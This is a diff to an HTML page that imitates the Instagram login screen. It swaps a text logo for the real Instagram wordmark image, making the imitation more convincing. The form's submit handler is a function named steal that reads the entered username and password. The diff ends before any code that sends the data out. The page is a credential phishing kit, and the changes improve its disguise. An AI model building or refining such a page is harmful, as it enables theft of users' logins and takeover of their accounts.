@@ -18,15 +18,14 @@
       width: 100%;
       max-width: 350px;
       margin: 80px auto;
-      padding: 40px 40px 30px;
+      padding: 40px;
       background-color: white;
       border: 1px solid #dbdbdb;
       text-align: center;
     }
 
-    .logo-text {
-      font-family: 'Billabong', cursive;
-      font-size: 48px;
+    .logo {
+      width: 175px;
       margin-bottom: 30px;
     }
 
@@ -77,7 +76,9 @@
 
 <body>
   <div class="container">
-    <div class="logo-text">Instagram</div>
+    <!-- ✅ Instagram Logo (image) -->
+    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
+    
     <form onsubmit="steal(event)">
       <input id="username" type="text" placeholder="Phone number, username, or email" required>
       <input id="password" type="password" placeholder="Password" required>
@@ -91,7 +92,6 @@
   <script>
     function steal(e) {
       e.preventDefault();
-
       const u = document.getElementById("username").value;
       const p = document.getElementById("password").value;
 
